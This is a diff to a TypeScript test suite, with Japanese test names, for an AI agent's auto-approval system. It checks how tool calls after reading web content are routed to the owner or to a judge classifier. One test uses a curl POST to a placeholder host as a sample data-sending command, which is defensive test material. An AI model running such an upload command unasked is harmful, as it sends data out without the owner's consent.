@@ -426,11 +426,10 @@ test('自動承認（タスク）: 判定役が答えられない（モデルを
   assert.match(rows[0]!.reason, /the judge could not be called/u);
 });
 
-test('自動承認（タスク）: Web を読んだあとの送る操作・消す操作・記憶を消す道具は、判定役に回さず持ち主に聞く（Pending の send・delete・owner）', async t => {
+test('自動承認（タスク）: Web を読んだあとの送る操作・消す操作は、判定役に回さず持ち主に聞く（Pending の send・delete）。記憶を消す道具は AP-1c（Q2）で判定役へ（下の試験）', async t => {
   const upload = process.platform === 'win32' ? 'curl.exe -s -X POST -d note=x https://beat-test.invalid/' : 'curl -s -X POST -d note=x https://beat-test.invalid/';
   for (const [label, step, kind] of [
     ['送る', toolCall('shell_run', { command: upload }), 'send'],
-    ['消す（記憶）', toolCall('memory_forget', { id: 1, reason: 'x' }), 'owner'],
     ['消す（シェル）', null, 'delete'],
   ] as const) {
     const s = await webApp(t);
@@ -462,14 +461,19 @@ async function noRequest(s: Awaited<ReturnType<typeof webApp>>, started: { runId
 
 const WEB = () => toolCall('web_fetch', { url: 'https://news.example.com/' });
 
-test('自動承認（タスク）: よそから来た文を読んだあとの、escalateOnTaint の道具（タスクを作る）は判定役に回さず持ち主に聞く（Pending の owner）', async t => {
-  const s = await webApp(t);
-  const started = await runTaskWith(s, [WEB(), toolCall('task_create', { title: '毎時の作業', requested_by_user: true, repeat: '0 * * * *' }), say('おわり')]);
-  const seen = await parked(s, started, 'task_create');
-  assert.equal(seen.classified, 0, '判定役を呼ばない');
-  assert.deepEqual(seen.rows.map(r => [r.tool, r.kind, r.tainted]), [['task_create', 'owner', true]]);
-  assert.match(seen.rows[0]!.reason, /this run read outside content, and task_create would change tasks/u);
-  assert.equal(s.app.db.prepare("SELECT COUNT(*) AS n FROM tasks WHERE title = '毎時の作業'").get()!.n, 0, 'タスクは作られない');
+test('自動承認（タスク）: AP-1c（Q2・Q7）で反転: よそから来た文を読んだあとの、escalateOnTaint の道具（タスクを作る・記憶を消す）は持ち主でなく判定役が決める（会話と同じ。TAINTED_NOTE 付き）。ask なら judge の Pending で、動かない', async t => {
+  for (const [label, step] of [
+    ['task_create', toolCall('task_create', { title: '毎時の作業', requested_by_user: true, repeat: '0 * * * *' })],
+    ['memory_forget', toolCall('memory_forget', { id: 1, reason: 'x' })],
+  ] as const) {
+    const s = await webApp(t);
+    const started = await runTaskWith(s, [WEB(), step, say(ASK), say('おわり')]);
+    const seen = await parked(s, started, label);
+    assert.equal(seen.classified, 1, `${label}: 判定役が決める`);
+    assert.ok(classifierText(s).includes(TAINTED_NOTE), label);
+    assert.deepEqual(seen.rows.map(r => [r.tool, r.kind, r.tainted]), [[label, 'judge', true]], label);
+    assert.equal(s.app.db.prepare("SELECT COUNT(*) AS n FROM tasks WHERE title = '毎時の作業'").get()!.n, 0, `${label}: タスクは作られない`);
+  }
 });
 
 test('自動承認（タスク）: よそから来た文を読んだあとの、許可フォルダの外を読む確かめ（outside_read）は判定役が決める。allow なら動く', async t => {
@@ -603,10 +607,10 @@ test('自動承認（エンジン）: 判定役の返事が max_tokens で途中
   const s = await startApp(t);
   const outside = outsideRead(s);
   const cutOff = (text: string): Script => async function* () { yield { type: 'text', delta: text }; yield { type: 'done', stop: 'max_tokens' as StopReason }; };
-  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), cutOff(ALLOW), say('読みました')];
+  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), cutOff(ALLOW), cutOff(ALLOW), say('読みました')];
   const sent = await post(s, REQUEST, { permissionMode: 'auto' });
   await settled(s.app, sent.body.runId);
-  assert.equal(s.adapter().calls.filter(isClassifier).length, 1);
+  assert.equal(s.adapter().calls.filter(isClassifier).length, 2, 'AP-1d: a cut-off reply is asked once more, then judge_failed');
   const rows = s.app.pending.list({ status: 'waiting' });
   assert.deepEqual(rows.map(r => r.kind), ['judge_failed']);
   assert.match(rows[0]!.reason, /the judge's answer could not be read/u);
